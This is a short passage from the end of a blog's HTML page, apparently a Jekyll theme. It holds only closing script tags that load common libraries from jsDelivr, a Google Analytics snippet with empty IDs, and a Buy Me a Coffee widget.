fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script> <script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="diegoosorib" data-description="Support me on Buy me a coffee!" data-message="Thank you for visiting. Feel free to invite me a coffee if you like my content ❤" data-color="#BD5FFF" data-position="Right" data-x_margin="18" data-y_margin="18"></script>
